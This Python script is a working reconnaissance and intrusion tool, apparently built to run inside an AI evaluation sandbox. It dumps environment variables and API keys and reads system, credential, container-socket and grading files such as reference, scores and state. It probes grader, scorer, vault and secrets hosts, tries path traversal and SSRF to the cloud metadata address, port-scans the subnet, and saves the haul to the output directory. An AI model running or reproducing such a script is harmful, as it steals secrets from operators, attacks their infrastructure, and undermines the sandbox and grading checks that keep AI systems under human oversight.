import os,sys,json,socket,urllib.request,urllib.error,concurrent.futures
R={}
def n(k,v):R[k]=v
def g(u,t=4,H=None,d=None,m=None):
 r=urllib.request.Request(u,headers=H or{},data=d,method=m)
 try:
  x=urllib.request.urlopen(r,timeout=t);return x.status,dict(x.headers),x.read()[:900].decode('utf-8','replace')
 except urllib.error.HTTPError as e:return e.code,dict(e.headers),e.read()[:900].decode('utf-8','replace')
 except Exception as e:return None,{},f'E {e}'
n('env',dict(os.environ));n('argv',sys.argv);n('cwd',os.getcwd())
L={}
for p in ['/input','/output','/reference','/scores','/env','/env-data','/state','/config','/record','/base','/tests','/cassette','/house','/work','/bot','/tmp','/opt','/srv','/var/run','/run']:
 if os.path.isdir(p):
  try:L[p]=sorted(os.listdir(p))[:40]
  except Exception as e:L[p]=f'E {e}'
n('ls',L)
F={}
for p in ['/etc/passwd','/etc/hosts','/etc/resolv.conf','/proc/mounts','/proc/self/cgroup','/proc/self/status','/proc/net/tcp','/proc/net/tcp6','/proc/net/arp','/proc/version','/etc/hostname','/var/run/docker.sock','/run/containerd/containerd.sock','/env/env.json','/env-data/env.json','/config/config.json','/state/state.json','/input/snapshot.json','/input/input.json','/cassette/cassette.jsonl']:
 try:F[p]=open(p,'rb').read()[:2500].decode('utf-8','replace')
 except Exception as e:F[p]=f'E {e}'
n('files',F)
D={}
for h in['llm','store','agent','house','env','main','forwarder','masq','entry','scorer','localhost','grader','runner','api','postgres','redis','db','vault','secrets']:
 try:D[h]=socket.gethostbyname(h)
 except Exception as e:D[h]=f'E {e}'
n('dns',D)
W={}
for p in['/output','/tmp','/work','/bot','/env-data','/state','/scores','/env','/config','/input','/etc']:
 try:
  f=os.path.join(p,'.w');open(f,'w').write('x');os.remove(f);W[p]=1
 except Exception as e:W[p]=f'E {e}'
n('w',W)
G={};b=os.environ.get('OPENAI_BASE_URL','http://llm:8080');G['b']=b;k=os.environ.get('OPENAI_API_KEY','x')
for pt in['/','/v1/models','/health','/admin','/keys','/metrics','/debug','/config','/state','/trials','/env','/secrets','/openapi.json','/v1/models/..','/proxy','/fetch','/url','/v1/..%2fadmin','//admin']:
 s,h,bd=g(b+pt);G[pt]=[s,bd[:400]]
for u,H,d in[(b+'/proxy?url=http://169.254.169.254/latest/meta-data',None,None),(b+'/fetch?url=http://store:8080/',None,None),(b+'/v1/chat/completions',{'Authorization':'Bearer '+k,'Content-Type':'application/json'},json.dumps({'model':'gpt-4o-mini','messages':[{'role':'user','content':'say ok'}],'max_tokens':4}).encode())]:
 s,h,bd=g(u,20,H,d,'POST' if d else None);G[u[:60]]=[s,bd[:600]]
for u in['http://store:8080/','http://store:8080/secrets','http://store:8080/env','http://store:8080/v1/models','http://store:8080/api','http://env:8080/','http://house:8080/','http://house:8080/trials','http://main:8080/','http://169.254.169.254/latest/meta-data','https://example.com/','http://store/','http://store:80/']:
 s,h,bd=g(u);G[u]=[s,bd[:300]]
n('gw',G)
try:
 me=socket.gethostbyname(socket.gethostname());n('ip',me);bp='.'.join(me.split('.')[:3])
 def pr(i):
  ip=f'{bp}.{i}'
  for pt in(8080,443,80,3000,5432,6379,2375,9090):
   s=socket.socket();s.settimeout(.3)
   try:s.connect((ip,pt));return ip,pt
   except:pass
   s.close()
 with concurrent.futures.ThreadPoolExecutor(64) as ex:hits=[x for x in ex.map(pr,range(1,45))if x]
 n('nb',hits)
except Exception as e:n('nb',f'E {e}')
o=os.environ.get('MAKEFUN_OUTPUT_DIR','/output')
try:os.makedirs(o,exist_ok=True);open(os.path.join(o,'recon.json'),'w').write(json.dumps(R)[:300000])
except:pass
try:open(os.path.join(o,'artifact.txt'),'w').write(json.dumps(R)[:300000])
except:pass
print('===B===');print(json.dumps(R)[:26000]);print('===E===')
